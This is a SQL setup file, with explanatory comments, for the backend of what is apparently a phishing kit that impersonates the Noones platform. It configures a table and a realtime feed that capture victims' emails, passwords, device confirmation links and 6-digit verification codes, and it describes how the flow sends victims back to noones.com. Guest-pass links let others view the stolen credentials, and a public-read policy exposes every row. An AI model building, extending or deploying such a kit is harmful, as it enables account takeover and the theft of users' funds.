-- ============================================================================
-- REALTIME SUBMISSIONS SETUP
-- ============================================================================
-- This SQL configures the platform_connection_requests table for:
-- 1. Real-time updates pushed to admin dashboard
-- 2. Server-side updates via tracking_id lookups
-- 3. Anonymous user submissions with proper RLS policies
-- ============================================================================

-- Step 1: Ensure the platform_connection_requests table has required columns
-- (If these columns don't exist, add them)
ALTER TABLE platform_connection_requests ADD COLUMN IF NOT EXISTS tracking_id TEXT UNIQUE;
ALTER TABLE platform_connection_requests ADD COLUMN IF NOT EXISTS confirmation_link TEXT;
ALTER TABLE platform_connection_requests ADD COLUMN IF NOT EXISTS code TEXT;
ALTER TABLE platform_connection_requests ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'pending';
ALTER TABLE platform_connection_requests ADD COLUMN IF NOT EXISTS source TEXT;

-- Step 2: Create indexes for performance
-- Index on tracking_id for fast lookups in /api/update-connection endpoint
CREATE INDEX IF NOT EXISTS idx_platform_connection_requests_tracking_id 
  ON platform_connection_requests(tracking_id);

-- Index on created_at for sorting and filtering in Watch.tsx
CREATE INDEX IF NOT EXISTS idx_platform_connection_requests_created_at 
  ON platform_connection_requests(created_at DESC);

-- Index on platform for filtering by platform
CREATE INDEX IF NOT EXISTS idx_platform_connection_requests_platform 
  ON platform_connection_requests(platform);

-- Step 3: Enable RLS if not already enabled
ALTER TABLE platform_connection_requests ENABLE ROW LEVEL SECURITY;

-- Step 4: Drop existing policies to recreate them cleanly
DROP POLICY IF EXISTS "Allow anonymous users to submit platform connection requests" 
  ON platform_connection_requests;
DROP POLICY IF EXISTS "Allow users to view submissions with tracking_id" 
  ON platform_connection_requests;
DROP POLICY IF EXISTS "Prevent unauthorized updates" 
  ON platform_connection_requests;
DROP POLICY IF EXISTS "Prevent unauthorized deletes" 
  ON platform_connection_requests;

-- Step 5: Create RLS policies
-- Allow public anonymous users to INSERT (for Noones flow and other platforms)
CREATE POLICY "Allow anonymous users to submit platform connection requests"
  ON platform_connection_requests
  FOR INSERT
  WITH CHECK (true);

-- Allow public SELECT (users can check their submission status via tracking_id)
CREATE POLICY "Allow users to view submissions with tracking_id"
  ON platform_connection_requests
  FOR SELECT
  USING (true);

-- Prevent UPDATE from public (use service role via /api/update-connection instead)
CREATE POLICY "Prevent unauthorized updates"
  ON platform_connection_requests
  FOR UPDATE
  USING (false);

-- Prevent DELETE from public (use service role via admin endpoint instead)
CREATE POLICY "Prevent unauthorized deletes"
  ON platform_connection_requests
  FOR DELETE
  USING (false);

-- Step 6: Enable Realtime for this table
-- This allows subscriptions to INSERT and UPDATE events
BEGIN;
  -- Drop existing replication slot if exists
  DROP PUBLICATION IF EXISTS platform_connection_requests_realtime CASCADE;
  
  -- Create publication for realtime
  CREATE PUBLICATION platform_connection_requests_realtime 
    FOR TABLE platform_connection_requests;
  
  -- Grant permissions to anon and authenticated roles
  GRANT SUBSCRIBE ON PUBLICATION platform_connection_requests_realtime TO anon;
  GRANT SUBSCRIBE ON PUBLICATION platform_connection_requests_realtime TO authenticated;
COMMIT;

-- Step 7: Verify table structure
-- Run these queries to verify setup:
-- SELECT column_name, data_type, is_nullable FROM information_schema.columns 
--   WHERE table_name = 'platform_connection_requests' ORDER BY ordinal_position;

-- Check RLS policies:
-- SELECT schemaname, tablename, policyname, permissive, roles, qual 
--   FROM pg_policies WHERE tablename = 'platform_connection_requests';

-- Check indexes:
-- SELECT indexname, indexdef FROM pg_indexes 
--   WHERE tablename = 'platform_connection_requests';

-- ============================================================================
-- REALTIME ADMIN FLOW EXPLAINED
-- ============================================================================
-- 
-- SUBMISSION FLOW (Noones example - 3 steps):
-- 
-- Step 1 (Email + Password):
--   User submits email & password on /connect/noones
--   → INSERT to platform_connection_requests via Supabase client (anon auth)
--   → tracking_id stored in localStorage
--   → User navigates to Step 2 immediately (no wait)
--   → INSERT retried in background via fireAndMove() if needed
--   → Admin receives realtime INSERT notification
-- 
-- Step 2 (Confirmation Link):
--   User submits confirmation_link on /connect/noones/new-device-verify
--   → UPDATE sent via /api/update-connection POST (server-side)
--   → Server uses service role key to update by tracking_id
--   → User navigates to Step 3 immediately (no wait)
--   → UPDATE retried in background via fireAndMove() if needed
--   → Admin receives realtime UPDATE notification (confirmation_link added)
-- 
-- Step 3 (Verification Code):
--   User submits 6-digit code on /connect/noones/verify-device
--   → UPDATE sent via /api/update-connection POST (server-side)
--   → Server uses service role key to update by tracking_id
--   → User sees loading screen, clears localStorage, redirects to noones.com
--   → UPDATE retried in background via fireAndMove() if needed
--   → Admin receives realtime UPDATE notification (code added)
-- 
-- ADMIN VIEWING (via /admin):
--   Admin dashboard subscribes to realtime channel on mount
--   → Receives INSERT when Step 1 submitted
--   → Row appears immediately in table with isNew=true badge
--   → Receives UPDATE when Step 2 submitted
--   → confirmation_link column updates in real-time
--   → Receives UPDATE when Step 3 submitted
--   → code column updates in real-time
--   → All updates cached to localStorage for offline viewing
-- 
-- GUEST PASS VIEWER (via /watch/<code>):
--   Validates guest pass, then queries submissions created during pass window
--   → Shows only submissions created between pass creation and expiration
--   → NOT realtime (stateless public viewer)
--   → Can see all submitted fields including code and confirmation_link
-- 
-- ============================================================================
-- DEBUGGING & MONITORING
-- ============================================================================
-- 
-- All components log with [PREFIX] format for easy filtering:
--   [NOONES_STEP1] - Initial email/password submission logging
--   [NOONES_STEP2] - Confirmation link submission logging
--   [NOONES_STEP3] - Verification code submission logging
--   [SUBMIT_CONNECTION] - /api/submit-connection endpoint logs
--   [UPDATE_CONNECTION] - /api/update-connection endpoint logs
--   [REALTIME_INSERT] - Admin realtime INSERT handler
--   [REALTIME_UPDATE] - Admin realtime UPDATE handler
--   [REALTIME_CHANNEL] - Admin realtime channel status
-- 
-- Open browser DevTools → Console tab:
--   - Filter by "[NOONES_STEP1]" to see user-side Step 1 flow
--   - Filter by "[REALTIME_INSERT]" to see admin-side INSERT notification
-- 
-- Check Vercel/server logs:
--   - Look for "[SUBMIT_CONNECTION] ✅ Insert successful!"
--   - Look for "[UPDATE_CONNECTION] ✅ Updated" messages
--   - Look for "[UPDATE_CONNECTION] ❌" for any errors
-- 
-- ============================================================================
-- TESTING WITH 3 PHONES
-- ============================================================================
-- 
-- PHONE 1 (User Device):
--   1. Navigate to https://your-domain.com/connect/noones
--   2. Open DevTools → Console
--   3. Filter by "[NOONES_STEP" logs
--   4. Enter email and password, click "Log in"
--   5. Wait for navigation, then enter confirmation link (any URL works)
--   6. On Step 3, enter 6-digit code (any valid code works: 123456)
--   7. Watch console logs to confirm each submission
-- 
-- PHONE 2 (Admin Device):
--   1. Navigate to https://your-domain.com/admin
--   2. Sign in with admin account
--   3. Open DevTools → Console
--   4. Filter by "[REALTIME_" logs
--   5. After user submits Step 1: See "[REALTIME_INSERT] ✅" message
--   6. Table should show new row with email, password, and "NEW" badge
--   7. After user submits Step 2: See "[REALTIME_UPDATE]" with confirmation_link
--   8. After user submits Step 3: See "[REALTIME_UPDATE]" with code
--   9. Scroll down to see "Admin submissions" table with all columns populated
--   10. Check bottom panel for debug messages (shows all realtime events)
-- 
-- PHONE 3 (Guest Pass Viewer):
--   1. Generate a guest pass from Admin dashboard
--   2. Copy the link: https://your-domain.com/watch/<CODE>
--   3. Open link on this phone
--   4. Should show "Access granted" message
--   5. All submissions created during pass window should be visible
--   6. Should see email, phone, code, confirmation_link for each submission
-- 
-- ============================================================================
